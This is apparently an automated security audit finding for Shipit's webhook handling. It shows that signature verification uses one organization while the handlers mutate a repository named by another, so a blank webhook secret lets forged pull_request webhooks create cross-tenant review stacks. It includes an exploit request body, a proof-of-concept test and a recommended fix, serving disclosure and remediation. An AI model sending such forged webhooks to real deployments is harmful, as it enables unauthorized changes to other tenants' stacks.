### Title
Auth org and mutated-repo org are never bound, letting a blank-secret org's fallback bypass validate cross-tenant stack creation - (File: app/controllers/shipit/webhooks_controller.rb)

### Summary
`WebhooksController#verify_signature` picks the GitHub App/secret to validate a webhook against using `repository_owner`, which falls back from `repository.owner.login` to `organization.login` [1](#0-0) . `Handler#initialize`/`OpenedHandler#repository` never re-read that same value; they independently resolve the target repository from `repository.full_name` [2](#0-1) . Since `OpenedHandler`'s `ExplicitParameters` schema only `requires :repository do requires :full_name, String end` and never requires `repository.owner.login` [3](#0-2) , an attacker can send a body where the two fields point at unrelated organizations, and `ReviewStackAdapter#create!` will write a stack for the repository named in `repository.full_name` regardless of which org's app authenticated the request.

### Finding Description
Binding claimed to hold: `org_used_for_signature_verification (repository_owner) == org_owning_the_repository_row_mutated (Repository.from_github_repo_name(params.repository.full_name).owner)`.

Trace:
- `WebhooksController#create` parses the raw body and dispatches to handlers with the same hash used for `repository_owner` [4](#0-3) .
- `verify_signature` resolves the app via `Shipit.github(organization: repository_owner)`, where `repository_owner = params.dig('repository','owner','login') || params.dig('organization','login')` [5](#0-4) .
- `Shipit.github` looks up per-org config via `github_app_config(organization)`, and raises `GithubOrganizationUnknown` (→ HTTP 422) if that org key isn't present in `secrets.github` in multi-org mode [6](#0-5) .
- `GitHubApp#verify_webhook_signature` unconditionally returns `true` when that resolved app's `webhook_secret` is blank: `return true unless webhook_secret` [7](#0-6) . A blank `webhook_secret` per organization is an explicitly supported configuration shape (`webhook_secret: # nil`) [8](#0-7) .
- If the request passes, `OpenedHandler.new(params).process` resolves the target repository purely from `params.repository.full_name`, independent of `repository_owner`: `Shipit::Repository.from_github_repo_name(params.repository.full_name)` [2](#0-1) , then calls `ReviewStackAdapter.new(params, scope: repository.review_stacks).find_or_create!`, which mutates the DB via `scope.create!(stack_attributes)` [9](#0-8) .

Exploit request: POST `/webhooks` with header `X-Github-Event: pull_request`, any/garbage `X-Hub-Signature`, and a JSON body:
```json
{
  "action": "opened",
  "number": 999,
  "pull_request": {"id":1,"number":999,"url":"x","title":"x","state":"open","additions":0,"deletions":0,
    "head":{"sha":"x","ref":"attacker-branch"},"user":{"login":"attacker"},"assignees":[],"labels":[]},
  "repository": {"full_name": "victim-org/target-repo"},
  "sender": {"login":"attacker"},
  "organization": {"login": "attacker-controlled-empty-org"}
}
```
Here `repository.owner.login` is omitted entirely so `repository_owner` falls back to `organization.login`. If `attacker-controlled-empty-org` is a configured org in Shipit's multi-org `secrets.github` with a blank `webhook_secret`, `verify_signature` passes unconditionally regardless of the bogus signature, while `OpenedHandler` creates a stack for `victim-org/target-repo` (a repository owned and authenticated by a completely different, unrelated org's app config). Existing guards do not stop this: `drop_unhandled_event` only checks the event has a handler; `ExplicitParameters` never requires `repository.owner.login`; there is no post-verification check anywhere in `Handler`, `OpenedHandler`, or `ReviewStackAdapter` that `repository.full_name`'s owner matches `repository_owner`.

### Impact Explanation
An attacker with no Shipit credentials and no webhook secret can create (and, via `LabeledHandler`/`UnlabeledHandler`/`ReopenedHandler`, archive/unarchive/reprovision) review stacks on any repository already tracked by Shipit under a *different* organization than the one whose (secret-less) config satisfied signature verification, using fully attacker-controlled `branch`, PR number, and labels. This is a cross-tenant stack-mutation/authentication-bypass matching the Critical category ("a payload for one repository mutating another's stack ... an unauthorized deploy"). Repeatable against any repository already registered in Shipit's database, for every affected event/handler that keys off `repository.full_name` without re-checking `repository_owner`.

### Likelihood Explanation
This requires Shipit to be run in multi-org mode (`secrets.github` keyed by org name) with at least one configured organization whose `webhook_secret` is blank/unset — a configuration explicitly documented and supported by the codebase (`config/secrets.development.shopify.yml`, `docs/setup.md`). In single-org mode the fallback is moot because `Shipit.github` ignores the `organization:` argument and always uses the one top-level secret [10](#0-9) , so the attacker would still need that one real secret. Given the precondition (a real multi-org deployment with an org onboarded without a webhook secret, e.g. during setup/testing or a low-trust org), attacker cost is trivial: a single unauthenticated HTTP POST, fully repeatable, and does not require GitHub at all.

### Recommendation
After resolving `repository_owner` for signature verification, bind it to the repository actually referenced by the payload: reject the webhook (or independently re-validate) if `params.dig('repository','full_name')&.split('/')&.first&.downcase != repository_owner&.downcase`. Additionally, require `repository.owner.login` in every handler's `ExplicitParameters` schema and cross-check it against `repository.full_name`'s owner, and treat a blank `webhook_secret` for a configured org as a deployment error unless explicitly opted into (e.g., only allow in non-production/test environments), rather than silently allowing unsigned requests.

### Proof of Concept
```ruby
# test/controllers/webhooks_controller_organization_fallback_test.rb
require 'test_helper'

module Shipit
  class WebhooksControllerOrganizationFallbackTest < ActionController::TestCase
    test "organization fallback for signature verification does not bind to repository.full_name's owner" do
      # Simulate multi-org config where 'attacker-controlled-empty-org' has no webhook_secret
      Shipit.stubs(:github_default_organization).returns('attacker-controlled-empty-org')
      Shipit.stubs(:github_app_config).with('attacker-controlled-empty-org').returns({})
      # verify_webhook_signature returns true because webhook_secret is blank
      Shipit.github(organization: 'attacker-controlled-empty-org') # warms/asserts no raise

      repository = shipit_repositories(:shipit) # owner: victim-org, name: target-repo
      repository.provisioning_behavior = :allow_all
      repository.save!

      body = {
        action: "opened",
        number: 999,
        pull_request: {
          id: 1, number: 999, url: "x", title: "x", state: "open",
          additions: 0, deletions: 0,
          head: { sha: "x", ref: "attacker-branch" },
          user: { login: "attacker" }, assignees: [], labels: []
        },
        repository: { full_name: repository.github_repo_name }, # "victim-org/target-repo", no owner.login
        sender: { login: "attacker" },
        organization: { login: "attacker-controlled-empty-org" }
      }.to_json

      request.headers['X-Github-Event'] = 'pull_request'
      request.headers['X-Hub-Signature'] = 'sha1=deadbeef' # attacker has no secret, garbage signature

      assert_difference -> { repository.stacks.count }, 1 do
        post :create, body:, as: :json
      end

      assert_response :ok
    end
  end
end
```
Assertions on both sides of the (broken) binding: `repository_owner` resolves to `"attacker-controlled-empty-org"` (via the `organization.login` fallback) while the mutated row belongs to `Repository.from_github_repo_name("victim-org/target-repo")` — an unrelated org — and the stack count on that repository still increases despite the bogus/unowned signature.

### Citations

**File:** app/controllers/shipit/webhooks_controller.rb (L10-15)
```ruby
    def create
      params = JSON.parse(request.raw_post)
      Shipit::Webhooks.for_event(event).each { |handler| handler.call(params) }

      head(:ok)
    end
```

**File:** app/controllers/shipit/webhooks_controller.rb (L24-30)
```ruby
    def verify_signature
      github_app = Shipit.github(organization: repository_owner)
      verified = github_app.verify_webhook_signature(
        request.headers['X-Hub-Signature'],
        request.raw_post
      )
      head(422) unless verified
```

**File:** app/controllers/shipit/webhooks_controller.rb (L59-62)
```ruby
    def repository_owner
      # Fallback to the organization sub-object if repository isn't included in the payload
      params.dig('repository', 'owner', 'login') || params.dig('organization', 'login')
    end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/opened_handler.rb (L33-35)
```ruby
            requires :repository do
              requires :full_name, String
            end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/opened_handler.rb (L50-54)
```ruby
          def repository
            @repository ||=
              Shipit::Repository.from_github_repo_name(params.repository.full_name) ||
              Shipit::NullRepository.new
          end
```

**File:** lib/shipit.rb (L170-200)
```ruby
  def github(organization: github_default_organization)
    # Backward compatibility
    # nil signifies the single github app config schema is being used
    if github_default_organization.nil?
      config = secrets.github
    else
      config = github_app_config(organization)
      raise GithubOrganizationUnknown, organization if config.nil?
    end
    @github ||= {}
    @github[organization] ||= GitHubApp.new(organization, config)
  end

  def github_default_organization
    return nil unless secrets&.github

    org = secrets.github.keys.first
    TOP_LEVEL_GH_KEYS.include?(org) ? nil : org
  end

  def github_organizations
    return [nil] unless github_default_organization

    secrets.github.keys
  end

  def github_app_config(organization)
    github_config = secrets.github.deep_transform_keys(&:downcase)
    github_organization = organization.downcase.to_sym
    github_config[github_organization]
  end
```

**File:** lib/shipit/github_app.rb (L76-83)
```ruby
    def verify_webhook_signature(signature, message)
      return true unless webhook_secret

      algorithm, signature = signature.split("=", 2)
      return false unless algorithm == 'sha1'

      SecureCompare.secure_compare(signature, OpenSSL::HMAC.hexdigest(algorithm, webhook_secret, message))
    end
```

**File:** config/secrets.development.shopify.yml (L1-23)
```yaml
host: 'shipit-engine.myshopify.io'

# For creating an app see: https://github.com/Shopify/shipit-engine/blob/main/docs/setup.md#creating-the-github-app

github:
  somegithuborg:
    app_id:
    installation_id:
    webhook_secret: # nil
    private_key:
    oauth:
      id:
      secret:
      teams:
  someothergithuborg:
    app_id:
    installation_id:
    webhook_secret: # nil
    private_key:
    oauth:
      id:
      secret:
      teams:
```

**File:** app/models/shipit/webhooks/handlers/pull_request/review_stack_adapter.rb (L72-85)
```ruby
          def create!
            ReviewStack.transaction do
              stack = scope.create!(stack_attributes)
              stack
                .build_pull_request
                .update!(
                  github_pull_request: params.pull_request
                )
            end

            Shipit::ReviewStackProvisioningQueue.add(stack)

            @stack = stack
          end
```
